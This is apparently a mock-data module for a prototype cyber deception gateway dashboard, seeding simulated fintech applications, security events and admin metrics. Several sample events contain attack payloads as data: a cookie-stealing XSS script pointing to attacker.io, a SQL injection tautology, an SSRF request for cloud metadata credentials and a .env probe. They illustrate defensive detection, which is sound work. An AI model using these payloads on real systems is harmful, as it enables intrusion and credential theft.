/**
 * Mock Data Service for Cyber Deception Gateway
 * All data in this file is strictly simulated for demonstration and prototyping purposes.
 * It is NOT live security telemetry.
 */

export const IS_DEMO_DATA = true;
export const DEMO_DATA_DISCLAIMER = "DEMO DATA: Simulated telemetry for prototype evaluation only.";

const STORAGE_KEY_APPS = 'cyber_deception_apps_v2';
const STORAGE_KEY_SETTINGS = 'cyber_deception_settings_v2';

// --- Default Applications Seed Data ---
export const DEFAULT_APPLICATIONS = [
  {
    id: "app-01",
    name: "Customer Accounts API",
    domain: "api.apexfintech.io",
    route: "api.apexfintech.io/v2/accounts",
    environment: "production",
    status: "shielded",
    protectionMode: "Synthetic SQL & API Decoys",
    description: "Core RESTful accounts microservice serving authenticated retail banking customers.",
    tags: ["Banking", "Accounts", "PCI-DSS", "REST"],
    requestsPerSec: 420,
    requestVolume: "1,240,500 reqs/day",
    threatCount: 384,
    threatIndex: "Low",
    activeDecoys: 4,
    lastActivity: "1 min ago",
    createdAt: "2026-08-15T10:00:00Z",
    updatedAt: "2026-10-24T14:30:00Z",
    cnameTarget: "cname.gateway.apexfintech.internal",
    upstreamUrl: "https://internal-k8s.apexfintech.io/accounts"
  },
  {
    id: "app-02",
    name: "Payment Settlement Core",
    domain: "payments.apexfintech.io",
    route: "payments.apexfintech.io/checkout",
    environment: "production",
    status: "shielded",
    protectionMode: "Adaptive Emulation Sandbox",
    description: "High-volume card processing and instant settlement execution pipeline.",
    tags: ["Payments", "Settlement", "High-Value", "Zero-Trust"],
    requestsPerSec: 285,
    requestVolume: "840,000 reqs/day",
    threatCount: 512,
    threatIndex: "Medium",
    activeDecoys: 6,
    lastActivity: "4 mins ago",
    createdAt: "2026-08-20T11:30:00Z",
    updatedAt: "2026-10-25T08:15:00Z",
    cnameTarget: "cname.gateway.apexfintech.internal",
    upstreamUrl: "https://internal-k8s.apexfintech.io/payments"
  },
  {
    id: "app-03",
    name: "Enterprise Admin Portal",
    domain: "admin.apexfintech.io",
    route: "admin.apexfintech.io/manage",
    environment: "production",
    status: "shielded",
    protectionMode: "Canary Credentials & Honey-routes",
    description: "Privileged administration console for operations staff, compliance officers, and tenant supervisors.",
    tags: ["Internal", "Admin", "RBAC", "Canary-Guarded"],
    requestsPerSec: 45,
    requestVolume: "128,400 reqs/day",
    threatCount: 920,
    threatIndex: "Elevated",
    activeDecoys: 8,
    lastActivity: "Just now",
    createdAt: "2026-07-10T09:00:00Z",
    updatedAt: "2026-10-25T11:00:00Z",
    cnameTarget: "cname.gateway.apexfintech.internal",
    upstreamUrl: "https://internal-admin.apexfintech.io"
  },
  {
    id: "app-04",
    name: "Mobile Banking Gateway",
    domain: "mobile-gw.apexfintech.io",
    route: "mobile-gw.apexfintech.io/graphql",
    environment: "production",
    status: "shielded",
    protectionMode: "Schema Poisoning Decoys",
    description: "Aggregated GraphQL BFF (Backend for Frontend) powering iOS and Android native apps.",
    tags: ["Mobile", "GraphQL", "BFF", "Public-Facing"],
    requestsPerSec: 180,
    requestVolume: "540,000 reqs/day",
    threatCount: 248,
    threatIndex: "Low",
    activeDecoys: 3,
    lastActivity: "12 mins ago",
    createdAt: "2026-09-01T14:00:00Z",
    updatedAt: "2026-10-22T16:45:00Z",
    cnameTarget: "cname.gateway.apexfintech.internal",
    upstreamUrl: "https://internal-graphql.apexfintech.io"
  },
  {
    id: "app-05",
    name: "Partner B2B Webhook Ingress",
    domain: "hooks.apexfintech.io",
    route: "hooks.apexfintech.io/v1/incoming",
    environment: "staging",
    status: "shielded",
    protectionMode: "Shadow API Shadowing",
    description: "External partner webhook receiver for ACH notifications, payment callbacks, and KYC webhooks.",
    tags: ["Partner", "Webhooks", "Staging", "External-Ingress"],
    requestsPerSec: 62,
    requestVolume: "185,000 reqs/day",
    threatCount: 165,
    threatIndex: "Low",
    activeDecoys: 2,
    lastActivity: "25 mins ago",
    createdAt: "2026-09-15T08:30:00Z",
    updatedAt: "2026-10-23T10:10:00Z",
    cnameTarget: "cname-staging.gateway.apexfintech.internal",
    upstreamUrl: "https://staging-hooks.apexfintech.io"
  },
  {
    id: "app-06",
    name: "Wealth Management Microservice",
    domain: "invest.apexfintech.io",
    route: "invest.apexfintech.io/api/portfolio",
    environment: "development",
    status: "monitoring",
    protectionMode: "Monitoring Only",
    description: "Development sandbox for automated trading algorithm evaluation and portfolio optimization.",
    tags: ["Investments", "Sandbox", "Dev", "Experimental"],
    requestsPerSec: 18,
    requestVolume: "42,000 reqs/day",
    threatCount: 42,
    threatIndex: "Low",
    activeDecoys: 1,
    lastActivity: "1 hour ago",
    createdAt: "2026-10-01T15:00:00Z",
    updatedAt: "2026-10-24T18:20:00Z",
    cnameTarget: "cname-dev.gateway.apexfintech.internal",
    upstreamUrl: "https://dev-invest.apexfintech.io"
  }
];

// --- Comprehensive Security Events Seed Data ---
export const DEFAULT_SECURITY_EVENTS = [
  {
    id: "evt-901",
    timestamp: "2 mins ago",
    isoTimestamp: "2026-10-25T15:42:00Z",
    applicationId: "app-03",
    application: "Enterprise Admin Portal",
    sourceIp: "198.51.100.44",
    originCountry: "DE (Frankfurt)",
    asn: "AS24940 (Hetzner Online)",
    vector: "Credential Stuffing & Auth Bypass",
    category: "Authentication & Brute Force",
    severity: "critical",
    detectionOutcome: "Canary Token Triggered",
    routingOutcome: "routed_to_deception",
    gatewayAction: "Diverted to Fake Auth Shadow",
    details: "140 invalid tokens passed; attacker isolated in canary container with simulated JWT secrets.",
    simulatedRationale: "Heuristic Anomaly Detector scored 0.985 confidence. IP triggered Canary Credential Trap '/manage/login-canary'.",
    requestMetadata: {
      method: "POST",
      path: "/manage/v1/auth/token",
      userAgent: "python-requests/2.31.0 (Automated Tooling)",
      flaggedPayload: "username=superadmin&pass=******** (140 dictionary variations)",
      canaryHit: "CANARY_TOKEN_HASH_#88912"
    },
    deceptionInteraction: {
      containerId: "decoy-worker-pod-89b",
      decoyType: "Fake Admin Auth API",
      dwellTime: "3m 42s",
      attackerActionsLogged: 14,
      fakeResponseStatus: "200 OK (Fabricated Session Key Returned)"
    },
    policyDecision: "Active Diversion: Policy SEC-AUTH-09 executed."
  },
  {
    id: "evt-902",
    timestamp: "14 mins ago",
    isoTimestamp: "2026-10-25T15:30:00Z",
    applicationId: "app-01",
    application: "Customer Accounts API",
    sourceIp: "203.0.113.89",
    originCountry: "NL (Amsterdam)",
    asn: "AS16509 (Amazon Datacenter)",
    vector: "SQLi Injection Probe (/v2/users?id=1' OR)",
    category: "Injection Attacks",
    severity: "high",
    detectionOutcome: "Signature Match",
    routingOutcome: "routed_to_deception",
    gatewayAction: "Served Simulated DB Delay & Error",
    details: "Fingerprinting attempt delayed and logged in deception sandbox with synthetic database error schema.",
    simulatedRationale: "Query parameter parsing detected classic tautology SQL injection payload pattern.",
    requestMetadata: {
      method: "GET",
      path: "/v2/users?id=1'%20OR%20'1'='1'--",
      userAgent: "sqlmap/1.7.2#stable",
      flaggedPayload: "id=1' OR '1'='1'--",
      canaryHit: "None (Pattern match)"
    },
    deceptionInteraction: {
      containerId: "decoy-db-shadow-42",
      decoyType: "Synthetic PostgreSQL 14 Trap",
      dwellTime: "1m 18s",
      attackerActionsLogged: 6,
      fakeResponseStatus: "500 Internal Error (Fake PG Stack Trace)"
    },
    policyDecision: "Deceptive Delay: Latency injection + Synthetic Error."
  },
  {
    id: "evt-903",
    timestamp: "32 mins ago",
    isoTimestamp: "2026-10-25T15:12:00Z",
    applicationId: "app-02",
    application: "Payment Settlement Core",
    sourceIp: "192.0.2.112",
    originCountry: "US (Virginia)",
    asn: "AS14618 (Cloud Cluster)",
    vector: "SSRF Parameter Tampering",
    category: "SSRF & Cloud Metadata",
    severity: "high",
    detectionOutcome: "Threat Detected",
    routingOutcome: "routed_to_deception",
    gatewayAction: "Rerouted to Honey-Metadata Service",
    details: "Targeted AWS metadata endpoint (169.254.169.254); simulated IAM credentials dispatched.",
    simulatedRationale: "Outbound callback parameter contained link-local IPv4 cloud metadata address.",
    requestMetadata: {
      method: "POST",
      path: "/checkout/webhook?callback=http://169.254.169.254/latest/meta-data/",
      userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
      flaggedPayload: "callback=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
      canaryHit: "CANARY_IAM_ROLE_FAKE_ADMIN"
    },
    deceptionInteraction: {
      containerId: "decoy-imds-sink-07",
      decoyType: "Synthetic AWS IMDSv2 Decoy",
      dwellTime: "5m 02s",
      attackerActionsLogged: 9,
      fakeResponseStatus: "200 OK (Dispatched Canary AWS Access Keys)"
    },
    policyDecision: "Redirect to Canary Sink: Capture key usage downstream."
  },
  {
    id: "evt-904",
    timestamp: "1 hr ago",
    isoTimestamp: "2026-10-25T14:44:00Z",
    applicationId: "app-04",
    application: "Mobile Banking Gateway",
    sourceIp: "198.51.100.17",
    originCountry: "GB (London)",
    asn: "AS13335 (Cloudflare WARP)",
    vector: "GraphQL Introspection Brute-Force",
    category: "API & Schema Abuse",
    severity: "medium",
    detectionOutcome: "Heuristic Anomaly Flagged",
    routingOutcome: "routed_to_deception",
    gatewayAction: "Served Fabricated Schema Decoy",
    details: "Attacker attempting schema reverse-engineering; served fake dummy mutations and deprecated flags.",
    simulatedRationale: "Query volume of '__schema' requests exceeded baseline threshold by 400%.",
    requestMetadata: {
      method: "POST",
      path: "/graphql",
      userAgent: "GraphQL-Playground/1.8.10",
      flaggedPayload: "query { __schema { types { name fields { name } } } }",
      canaryHit: "CANARY_MUTATION_transferShadowFunds"
    },
    deceptionInteraction: {
      containerId: "decoy-graphql-poison-1",
      decoyType: "Fabricated GraphQL Schema",
      dwellTime: "8m 15s",
      attackerActionsLogged: 22,
      fakeResponseStatus: "200 OK (Decoy Types Delivered)"
    },
    policyDecision: "Schema Poisoning: Feed decoy entities to reconnaissance scanner."
  },
  {
    id: "evt-905",
    timestamp: "2 hrs ago",
    isoTimestamp: "2026-10-25T13:40:00Z",
    applicationId: "app-01",
    application: "Customer Accounts API",
    sourceIp: "198.51.100.201",
    originCountry: "FR (Paris)",
    asn: "AS16276 (OVHcloud)",
    vector: "Suspicious User-Agent Vulnerability Scanner",
    category: "Reconnaissance & Scanning",
    severity: "low",
    detectionOutcome: "Signature Match",
    routingOutcome: "quarantined",
    gatewayAction: "Throttled & Honey-token Injected",
    details: "Automated scan headers flagged; decoy canary cookie attached for persistent tracking.",
    simulatedRationale: "User-Agent matched known scanning tool signature (Nikto / OWASP ZAP).",
    requestMetadata: {
      method: "GET",
      path: "/v2/accounts/.env",
      userAgent: "Mozilla/5.0 (Nikto/2.1.6)",
      flaggedPayload: "Probe for .env / config.json",
      canaryHit: "None"
    },
    deceptionInteraction: {
      containerId: "decoy-rate-sink",
      decoyType: "Tarpit Throttler",
      dwellTime: "45s",
      attackerActionsLogged: 3,
      fakeResponseStatus: "429 Too Many Requests (Delay: 5000ms)"
    },
    policyDecision: "Rate Quarantined + Injected Tracking Beacon."
  },
  {
    id: "evt-906",
    timestamp: "3 hrs ago",
    isoTimestamp: "2026-10-25T12:30:00Z",
    applicationId: "app-03",
    application: "Enterprise Admin Portal",
    sourceIp: "192.0.2.89",
    originCountry: "US (California)",
    asn: "AS7018 (AT&T Services)",
    vector: "BOLA / IDOR Authorization Bypass (/admin/tenant/442)",
    category: "API & Schema Abuse",
    severity: "critical",
    detectionOutcome: "Canary Token Triggered",
    routingOutcome: "routed_to_deception",
    gatewayAction: "Served Fabricated Tenant Metadata",
    details: "Iterative identifier probe across sequential tenant IDs; routed into synthetic tenant sandbox.",
    simulatedRationale: "Horizontal authorization traversal pattern recognized.",
    requestMetadata: {
      method: "GET",
      path: "/admin/tenant/442/billing",
      userAgent: "PostmanRuntime/7.32.3",
      flaggedPayload: "Sequential integer traversal",
      canaryHit: "CANARY_TENANT_ID_442"
    },
    deceptionInteraction: {
      containerId: "decoy-tenant-sandbox-12",
      decoyType: "Synthetic Tenant Mock",
      dwellTime: "6m 20s",
      attackerActionsLogged: 18,
      fakeResponseStatus: "200 OK (Dummy Credit Card Data)"
    },
    policyDecision: "Active Deception: Provide honeypot tenant record."
  },
  {
    id: "evt-907",
    timestamp: "4 hrs ago",
    isoTimestamp: "2026-10-25T11:15:00Z",
    applicationId: "app-02",
    application: "Payment Settlement Core",
    sourceIp: "203.0.113.4",
    originCountry: "SG (Singapore)",
    asn: "AS4657 (StarHub)",
    vector: "Cross-Site Scripting (Stored XSS in Callback)",
    category: "Injection Attacks",
    severity: "medium",
    detectionOutcome: "Signature Match",
    routingOutcome: "blocked",
    gatewayAction: "Directly Blocked by L7 Filter",
    details: "Malicious script tags in payment metadata sanitized and dropped before upstream processing.",
    simulatedRationale: "HTML entity encoder flagged `<script>document.location=...</script>` in payload.",
    requestMetadata: {
      method: "POST",
      path: "/checkout/v1/notes",
      userAgent: "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
      flaggedPayload: "<script>window.location='http://attacker.io/steal?c='+document.cookie</script>",
      canaryHit: "None"
    },
    deceptionInteraction: {
      containerId: "n/a",
      decoyType: "Direct Drop",
      dwellTime: "0s",
      attackerActionsLogged: 1,
      fakeResponseStatus: "400 Bad Request (Payload Rejected)"
    },
    policyDecision: "Immediate Block: L7 Ingress WAF rule match."
  },
  {
    id: "evt-908",
    timestamp: "5 hrs ago",
    isoTimestamp: "2026-10-25T10:00:00Z",
    applicationId: "app-05",
    application: "Partner B2B Webhook Ingress",
    sourceIp: "198.51.100.88",
    originCountry: "CA (Montreal)",
    asn: "AS577 (Bell Canada)",
    vector: "Replay Attack with Expired Signature",
    category: "Authentication & Brute Force",
    severity: "low",
    detectionOutcome: "Signature Match",
    routingOutcome: "allowed",
    gatewayAction: "Allowed with Nonce Flagging",
    details: "HMAC timestamp was 45s behind threshold; allowed under observation to monitor partner retry pattern.",
    simulatedRationale: "Slight clock drift detected; deemed non-malicious partner webhook jitter.",
    requestMetadata: {
      method: "POST",
      path: "/v1/incoming/ach-notify",
      userAgent: "PartnerWebhookClient/2.1",
      flaggedPayload: "X-Hub-Signature-256: valid (timestamp skew: -45s)",
      canaryHit: "None"
    },
    deceptionInteraction: {
      containerId: "n/a",
      decoyType: "Passive Observation",
      dwellTime: "0s",
      attackerActionsLogged: 0,
      fakeResponseStatus: "202 Accepted (Processed Cleanly)"
    },
    policyDecision: "Allow under Passive Telemetry Observation."
  }
];

// --- Default Owner Settings Seed Data ---
export const DEFAULT_OWNER_SETTINGS = {
  organization: {
    tenantName: "Apex FinTech Cloud",
    tenantId: "tenant-apex-9941",
    contactEmail: "security-ops@apexfintech.io",
    environmentTier: "Enterprise Shield Tier",
    timezone: "UTC (Coordinated Universal Time)",
    dataResidency: "United States (US-East / US-West)"
  },
  displayPreferences: {
    defaultTimeRange: "24h",
    rowDensity: "compact",
    autoRefreshInterval: 30, // seconds
    showCanaryDetails: true
  },
  notificationPreferences: {
    emailAlertsCritical: true,
    emailAlertsHigh: true,
    honeynetTriggerDigest: true,
    webhookAlertsEnabled: false,
    webhookEndpoint: "https://siem.apexfintech.internal/webhooks/deception-events"
  },
  teamMembers: [
    {
      id: "tm-1",
      name: "Alex Vance",
      email: "alex.vance@apexfintech.io",
      role: "Security Principal (Owner)",
      status: "Active",
      lastLogin: "Active Now"
    },
    {
      id: "tm-2",
      name: "Elena Rostova",
      email: "elena.r@apexfintech.io",
      role: "Lead Cloud Architect",
      status: "Active",
      lastLogin: "2 hours ago"
    },
    {
      id: "tm-3",
      name: "David Kim",
      email: "david.kim@apexfintech.io",
      role: "DevOps / SRE Engineer",
      status: "Active",
      lastLogin: "Yesterday"
    },
    {
      id: "tm-4",
      name: "Priya Patel",
      email: "priya.p@apexfintech.io",
      role: "Incident Responder",
      status: "Invited (Simulated)",
      lastLogin: "Never"
    }
  ]
};

// --- Storage Accessors & Local Persistence Layer ---

function getStoredApps() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_APPS);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) return parsed;
    }
  } catch (e) {
    console.warn("Could not read stored applications, using defaults", e);
  }
  return DEFAULT_APPLICATIONS;
}

function setStoredApps(apps) {
  try {
    localStorage.setItem(STORAGE_KEY_APPS, JSON.stringify(apps));
  } catch (e) {
    console.warn("Could not persist applications", e);
  }
}

function getStoredSettings() {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_SETTINGS);
    if (raw) return JSON.parse(raw);
  } catch (e) {
    console.warn("Could not read stored settings, using defaults", e);
  }
  return DEFAULT_OWNER_SETTINGS;
}

function setStoredSettings(settings) {
  try {
    localStorage.setItem(STORAGE_KEY_SETTINGS, JSON.stringify(settings));
  } catch (e) {
    console.warn("Could not persist settings", e);
  }
}

// --- Public Service Methods for Applications ---

export const getApplications = async () => {
  return [...getStoredApps()];
};

export const getApplicationById = async (id) => {
  const apps = getStoredApps();
  return apps.find(a => a.id === id) || null;
};

export const createApplication = async (newAppData) => {
  const apps = getStoredApps();
  const nextNumber = apps.length + 1;
  const newApp = {
    ...newAppData,
    id: `app-${String(nextNumber).padStart(2, '0')}`,
    status: newAppData.status || "shielded",
    requestsPerSec: 0,
    requestVolume: "0 reqs/day",
    threatCount: 0,
    threatIndex: "Low",
    activeDecoys: newAppData.protectionMode === "Monitoring Only" ? 0 : 2,
    lastActivity: "Just registered",
    createdAt: new Date().toISOString(),
    updatedAt: new Date().toISOString(),
    cnameTarget: "cname.gateway.apexfintech.internal",
    upstreamUrl: `https://${newAppData.domain}`
  };
  const updated = [newApp, ...apps];
  setStoredApps(updated);
  return newApp;
};

export const updateApplication = async (id, patchData) => {
  const apps = getStoredApps();
  const index = apps.findIndex(a => a.id === id);
  if (index === -1) {
    throw new Error(`Application ${id} not found.`);
  }
  const updatedApp = {
    ...apps[index],
    ...patchData,
    updatedAt: new Date().toISOString()
  };
  apps[index] = updatedApp;
  setStoredApps(apps);
  return updatedApp;
};

export const deleteApplication = async (id) => {
  const apps = getStoredApps();
  const filtered = apps.filter(a => a.id !== id);
  setStoredApps(filtered);
  return true;
};

// --- Public Service Methods for Security Events ---

export const getSecurityEvents = async (filters = {}) => {
  let list = [...DEFAULT_SECURITY_EVENTS];

  if (filters.applicationId && filters.applicationId !== 'all') {
    list = list.filter(e => e.applicationId === filters.applicationId);
  }
  if (filters.severity && filters.severity !== 'all') {
    list = list.filter(e => e.severity === filters.severity);
  }
  if (filters.category && filters.category !== 'all') {
    list = list.filter(e => e.category === filters.category);
  }
  if (filters.routingOutcome && filters.routingOutcome !== 'all') {
    list = list.filter(e => e.routingOutcome === filters.routingOutcome);
  }
  if (filters.search) {
    const q = filters.search.toLowerCase().trim();
    list = list.filter(e =>
      e.id.toLowerCase().includes(q) ||
      e.sourceIp.toLowerCase().includes(q) ||
      e.vector.toLowerCase().includes(q) ||
      e.application.toLowerCase().includes(q) ||
      e.details.toLowerCase().includes(q)
    );
  }

  return list;
};

export const getSecurityEventById = async (id) => {
  const event = DEFAULT_SECURITY_EVENTS.find(e => e.id === id);
  return event || null;
};

export const getApplicationTraffic = async (appId) => {
  // Generate realistic time-series for a specific application
  return [
    { time: "00:00", requests: 12000, diverted: 35, blocked: 8 },
    { time: "03:00", requests: 8400, diverted: 22, blocked: 4 },
    { time: "06:00", requests: 11200, diverted: 30, blocked: 9 },
    { time: "09:00", requests: 28500, diverted: 92, blocked: 34 },
    { time: "12:00", requests: 36800, diverted: 115, blocked: 26 },
    { time: "15:00", requests: 41200, diverted: 124, blocked: 38 },
    { time: "18:00", requests: 31400, diverted: 84, blocked: 21 },
    { time: "21:00", requests: 19800, diverted: 54, blocked: 18 }
  ];
};

// --- Public Service Methods for Settings ---

export const getOwnerSettings = async () => {
  return getStoredSettings();
};

export const updateOwnerSettings = async (patch) => {
  const current = getStoredSettings();
  const merged = {
    ...current,
    ...patch,
    organization: { ...current.organization, ...(patch.organization || {}) },
    displayPreferences: { ...current.displayPreferences, ...(patch.displayPreferences || {}) },
    notificationPreferences: { ...current.notificationPreferences, ...(patch.notificationPreferences || {}) }
  };
  setStoredSettings(merged);
  return merged;
};

// --- Backward Compatible Overview Accessor for Stage 1 ---
export const ownerSummaryMetrics = {
  reportingPeriod: "Last 24 Hours",
  tenantName: "Apex FinTech Cloud",
  totalApplications: {
    value: 6,
    subtext: "All 6 active with deception decoys enabled",
    trend: "+1 this month"
  },
  requestsProcessed: {
    value: "1,428,950",
    numeric: 1428950,
    subtext: "Avg 992 req/sec across all routes",
    trend: "+8.4% vs yesterday"
  },
  threatsDetected: {
    value: "3,842",
    numeric: 3842,
    subtext: "0.27% of total ingress requests",
    trend: "-3.2% vs yesterday"
  },
  deceptionActions: {
    diverted: "1,289",
    divertedNumeric: 1289,
    blocked: "512",
    blockedNumeric: 512,
    subtext: "94.8% of high-confidence threats deceived or contained",
    trend: "+12.1% diversion efficacy"
  }
};

export const ownerTrafficTimeSeries = [
  { time: "00:00", totalRequests: 42000, cleanTraffic: 41850, divertedToDecoy: 110, blocked: 40 },
  { time: "03:00", totalRequests: 28000, cleanTraffic: 27910, divertedToDecoy: 72, blocked: 18 },
  { time: "06:00", totalRequests: 36000, cleanTraffic: 35890, divertedToDecoy: 85, blocked: 25 },
  { time: "09:00", totalRequests: 89000, cleanTraffic: 88640, divertedToDecoy: 260, blocked: 100 },
  { time: "12:00", totalRequests: 115000, cleanTraffic: 114620, divertedToDecoy: 295, blocked: 85 },
  { time: "15:00", totalRequests: 128000, cleanTraffic: 127590, divertedToDecoy: 310, blocked: 100 },
  { time: "18:00", totalRequests: 98000, cleanTraffic: 97720, divertedToDecoy: 215, blocked: 65 },
  { time: "21:00", totalRequests: 62000, cleanTraffic: 61780, divertedToDecoy: 152, blocked: 68 }
];

export const ownerThreatDistribution = [
  { name: "Critical", value: 428, color: "#ef4444" },
  { name: "High", value: 861, color: "#f97316" },
  { name: "Medium", value: 1493, color: "#eab308" },
  { name: "Low", value: 1060, color: "#3b82f6" }
];

export const ownerProtectedApps = DEFAULT_APPLICATIONS.slice(0, 5);
export const ownerSecurityEvents = DEFAULT_SECURITY_EVENTS.slice(0, 5);

export const getOwnerOverviewData = async () => {
  const currentApps = getStoredApps();
  return {
    metrics: {
      ...ownerSummaryMetrics,
      totalApplications: {
        value: currentApps.length,
        subtext: `All ${currentApps.length} enrolled in gateway protection`,
        trend: "+1 this month"
      }
    },
    trafficSeries: ownerTrafficTimeSeries,
    threatDistribution: ownerThreatDistribution,
    protectedApps: currentApps,
    securityEvents: DEFAULT_SECURITY_EVENTS.slice(0, 5),
    isDemoData: true
  };
};

// --- Gateway Administrator Mock Data (Preserved from Stage 1) ---

export const adminSummaryMetrics = {
  platformHealth: "Operational",
  latency: "1.4 ms",
  activeNodes: "12 / 12 Nodes Online",
  totalTenants: {
    value: 18,
    subtext: "58 total protected applications registered across tenants",
    trend: "+2 this quarter"
  },
  platformRequests: {
    value: "34,812,490",
    numeric: 34812490,
    subtext: "Global ingress across 4 geographic edge clusters",
    trend: "+14.2% vs last week"
  },
  suspiciousSessions: {
    value: "214",
    numeric: 214,
    subtext: "Active honeynet engagements underway",
    trend: "28 high-confidence attacker tracking sessions"
  },
  threatsNeutralized: {
    value: "14,920",
    numeric: 14920,
    subtext: "Diverted into sandbox or rate-isolated in last 24h",
    trend: "99.98% clean traffic SLA maintained"
  }
};

export const adminPlatformTrends = [
  { time: "00:00", platformIngress: 980000, suspiciousAttempts: 1240, decoyDiverted: 820 },
  { time: "04:00", platformIngress: 650000, suspiciousAttempts: 920, decoyDiverted: 610 },
  { time: "08:00", platformIngress: 1850000, suspiciousAttempts: 2480, decoyDiverted: 1720 },
  { time: "12:00", platformIngress: 2450000, suspiciousAttempts: 3150, decoyDiverted: 2240 },
  { time: "16:00", platformIngress: 2620000, suspiciousAttempts: 3410, decoyDiverted: 2510 },
  { time: "20:00", platformIngress: 1720000, suspiciousAttempts: 2190, decoyDiverted: 1530 }
];

export const adminDeceptionVectors = [
  { vector: "Fake REST API", engagements: 412 },
  { vector: "Admin Portal Decoy", engagements: 298 },
  { vector: "SSH/Telnet Decoy", engagements: 245 },
  { vector: "Honey-token Trigger", engagements: 189 },
  { vector: "Database Shadow Trap", engagements: 145 }
];

export const adminComponentHealth = [
  {
    id: "comp-proxy",
    name: "L7 Reverse Proxy & Ingress Filter",
    status: "operational",
    latency: "0.8ms",
    cluster: "Edge-Cluster-US-East",
    uptime: "99.99%"
  },
  {
    id: "comp-ai",
    name: "AI Behavioral Anomaly Detector",
    status: "operational",
    latency: "3.2ms",
    cluster: "Inference-Worker-Pool-1",
    uptime: "99.95%"
  },
  {
    id: "comp-deception",
    name: "Dynamic Deception Orchestrator",
    status: "operational",
    latency: "2.1ms",
    cluster: "Decoy-Runtime-Vanguard",
    uptime: "100.00%"
  },
  {
    id: "comp-telemetry",
    name: "Threat Telemetry & Event Stream Pipeline",
    status: "operational",
    latency: "1.2ms",
    cluster: "Kafka-Ingest-Broker-A",
    uptime: "99.98%"
  },
  {
    id: "comp-policy",
    name: "Tenant Isolation & Policy Engine",
    status: "operational",
    latency: "0.4ms",
    cluster: "Core-Policy-Matrix",
    uptime: "100.00%"
  }
];

export const adminHighSeverityEvents = [
  {
    id: "adm-evt-101",
    timestamp: "4 mins ago",
    tenant: "Apex FinTech Cloud",
    target: "Enterprise Admin Portal",
    sourceIp: "198.51.100.44",
    threatType: "Distributed Credential Stuffing & Session Hijack",
    deceptionStatus: "Active in Sandboxed Honeynet",
    severity: "critical"
  },
  {
    id: "adm-evt-102",
    timestamp: "19 mins ago",
    tenant: "MedSecure Health Net",
    target: "Patient Records FHIR API",
    sourceIp: "203.0.113.12",
    threatType: "Mass BOLA / IDOR Traversal Probe",
    deceptionStatus: "Rerouted to Synthetic Patient Database",
    severity: "critical"
  },
  {
    id: "adm-evt-103",
    timestamp: "45 mins ago",
    tenant: "OmniLogistics Global",
    target: "Fleet Dispatch WebSocket",
    sourceIp: "192.0.2.78",
    threatType: "Protocol Smuggling & Command Injection",
    deceptionStatus: "Isolated in Containerized Shadow Sink",
    severity: "high"
  },
  {
    id: "adm-evt-104",
    timestamp: "1 hr ago",
    tenant: "AeroDynamics Defence Lab",
    target: "Telemetry Ingestion Relay",
    sourceIp: "198.51.100.198",
    threatType: "Known Nation-State Scanning Signature (APT Probe)",
    deceptionStatus: "Honey-token Fingerprint Dispatched",
    severity: "critical"
  }
];

export const adminAuditLog = [
  {
    id: "aud-501",
    timestamp: "12 mins ago",
    adminUser: "sarah.chen@gateway-admin.internal",
    action: "POLICY_UPDATE",
    target: "Tenant: Apex FinTech Cloud - Stricter SQLi Diversion Threshold",
    status: "success",
    ip: "10.14.0.52"
  },
  {
    id: "aud-502",
    timestamp: "38 mins ago",
    adminUser: "system-orchestrator",
    action: "DECOY_POOL_SCALED",
    target: "Decoy-Cluster-US-East: Scaled from 30 to 45 containers",
    status: "success",
    ip: "10.14.0.1"
  },
  {
    id: "aud-503",
    timestamp: "2 hrs ago",
    adminUser: "marcus.vance@gateway-admin.internal",
    action: "QUARANTINE_IP_RANGE",
    target: "Range 198.51.100.0/24 placed into Persistent Honeynet diversion",
    status: "success",
    ip: "10.14.0.88"
  },
  {
    id: "aud-504",
    timestamp: "4 hrs ago",
    adminUser: "sarah.chen@gateway-admin.internal",
    action: "CANARY_TOKEN_ROTATION",
    target: "Global JWT Secret Canary Keys Rotated",
    status: "success",
    ip: "10.14.0.52"
  }
];

export const getAdminOverviewData = async () => {
  return {
    metrics: adminSummaryMetrics,
    trends: adminPlatformTrends,
    vectors: adminDeceptionVectors,
    components: adminComponentHealth,
    highSeverityEvents: adminHighSeverityEvents,
    auditEvents: adminAuditLog,
    isDemoData: true
  };
};
